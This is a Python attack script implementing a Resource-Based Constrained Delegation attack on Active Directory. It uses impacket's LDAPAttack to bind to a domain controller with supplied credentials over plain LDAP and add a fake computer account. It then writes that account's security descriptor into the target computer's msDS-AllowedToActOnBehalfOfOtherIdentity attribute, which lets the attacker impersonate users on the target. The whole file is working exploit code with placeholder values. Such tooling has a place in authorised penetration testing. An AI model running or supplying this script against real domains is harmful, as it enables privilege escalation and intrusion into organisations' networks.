#!/usr/bin/env python3
#
# Resource Based Constraint Delegation Attack
# 

import ldap3
import ldapdomaindump
from impacket import logging
from impacket.examples import logger
from impacket.examples.ntlmrelayx.attacks.ldapattack import LDAPAttack
from impacket.examples.ntlmrelayx.utils.config import NTLMRelayxConfig

attackeraccount = ('DOMAIN\\USER', 'PASSWORD')
fakecomputer = 'FAKE_COMPUTER_NAME'
targetcomputer = 'TARGET_COMPUTER_NAME'
dc = 'DC_IP'

targetsam = '{}$'.format(targetcomputer)
fakecomputersam = '{}$'.format(fakecomputer)

c = NTLMRelayxConfig()
c.addcomputer = fakecomputer
c.target = dc

logger.init()
logging.getLogger().setLevel(logging.INFO)
logging.info('Starting Resource Based Constrained Delegation Attack against {}'.format(targetsam))

logging.info('Initializing LDAP connection to {}'.format(dc))
#tls = ldap3.Tls(validate=ssl.CERT_NONE, version=ssl.PROTOCOL_TLSv1_2)
serv = ldap3.Server(dc, tls=False, get_info=ldap3.ALL)
logging.info('Using {} account with password ***'.format(attackeraccount[0]))
conn = ldap3.Connection(serv, user=attackeraccount[0], password=attackeraccount[1], authentication=ldap3.SIMPLE)
conn.bind()
logging.info('LDAP bind OK')

logging.info('Initializing domainDumper()')
cnf = ldapdomaindump.domainDumpConfig()
cnf.basepath = c.lootdir
dd = ldapdomaindump.domainDumper(serv, conn, cnf)

logging.info('Initializing LDAPAttack()')
la = LDAPAttack(c, conn, attackeraccount[0].replace('\\', '/'))

logging.info('Writing SECURITY_DESCRIPTOR related to `{}` fake computer into msDS-AllowedToActOnBehalfOfOtherIdentity of target computer `{}`'.format(fakecomputer, targetcomputer))
la.delegateAttack(fakecomputersam, targetsam, dd, sid=None)

